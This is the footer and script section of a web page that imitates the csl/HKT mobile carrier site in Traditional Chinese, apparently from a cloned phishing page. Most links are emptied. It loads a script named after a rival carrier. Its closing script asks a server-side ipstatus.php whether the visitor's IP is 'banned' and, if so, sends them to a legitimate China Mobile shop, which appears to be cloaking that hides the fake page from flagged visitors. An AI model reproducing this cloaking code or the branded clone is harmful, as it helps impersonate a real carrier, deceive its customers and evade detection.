<section class="contact_us_box-model hidden visible-xs-block">
  <div class="container">
    <div class="contact_us_list1">
      <ul>
        <li>快速鏈接</li>
        <li>
          <a href="#">最新消息</a></li>
        <li>
          <a href="#" target="_blank">csl網店</a></li>
        <li>
          <a href="#h" target="_blank">My HKT</a></li>
        <li>
          <a href="#">我的賬戶</a></li>
        <li>
          <a href="#h" target="_blank">上台/續約</a></li>
      </ul>
      <ul>
        <li>聯絡我們</li>
        <li>
          <a href="/tc/contact-us/">一般查詢</a></li>
        <li>
          <a href="/tc/csldigitalsalesteam/">網上銷售團隊</a></li>
        <li>
          <a href="/tc/shop/">csl 專門店</a></li>
      </ul>
    </div>
    <div class="contact_us_list2">
      <ul>
        <li>
          <ul>
            <li>
              <a href="#">csl 產品快線: 2888 2123</a></li>
            <li>
              <a href="#" target="_blank">WhatsApp 銷售專員: 5212 3123</a></li>
            <li>
              <a href="tel:+85225123123">24小時客戶服務熱線: 2512 3123</a></li>
            <br>
            <li>
              <a href="tel:+85234774089">24小時海外緊急支援熱線：+852 3477 4089</a></li>
            <li style="font-size: 10px;">(適用於csl服務計劃號碼的客戶,豁免由海外致電之漫遊通話費用)</li></ul>
        </li>
      </ul>
    </div>
    <div class="contact_us__model_link">
      <div>關注我們</div>
      <div>
        <!-- facebook -->
        <a href="#" target="_blank">
          <img src="/files/facebook.png" alt=""></a>
        <!-- instagram -->
        <a href="#" target="_blank">
          <img src="/files/ins.png" alt=""></a>
        <!-- mewe -->
        <a href="#" target="_blank">
          <img src="/files/mewe.png" alt=""></a>
        <!-- yotube -->
        <a href="#" target="_blank">
          <img src="/files/yotube.png" alt=""></a>
        <!-- wechatapps -->
        <a href="#" target="_blank">
          <img src="/files/wechatapps.png" alt=""></a>
        <!-- weixin -->
        <a href="javascript:;" class="weinxin_link">
          <img src="/files/weixin.png" alt="">
          <span class="code-box code-box-1" style="top: 49.5px;">
            <img src="/r/cms/pccw/2020/images/QR-code.png" alt=""></span>
        </a>
        <!-- shopping -->
        <a href="#" target="_blank">
          <img src="/files/shopping.png" alt=""></a>
      </div>
    </div>
    <!--<div class="contact_us_model_app">
      <div>下載 csl App</div>
      <div>
        <a href="#" target="_blank">
          <img src="/files/csl-icon.png" alt=""></a>
      </div>-->
    </div>
  
</section>
<script id="script_page" type="text/javascript" src="../assets/js/smartone.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
<script>
    setTimeout(() => {
        $('#site-preloader').fadeOut();
    }, 2000);

 
    jQuery(document).ready(function() {
   
        init_ip_status();
    });

    function init_ip_status() {
        //  console.log('ipstatus ===>',<?php // $_SESSION['ipstatus']  ?>)
        $.ajax({

            type: 'GET',

            url: '../ipstatus.php',

            success: function(data) {

                console.log("ip is banned ==>", data === '1');
                if (data === '1') {
                    window.location.href = 'https://eshop.hk.chinamobile.com/tc/index.html';
                }
            },
            error: function(xhr, status, error) {

            }

        });
    }

   
</script>

   </body>
</html>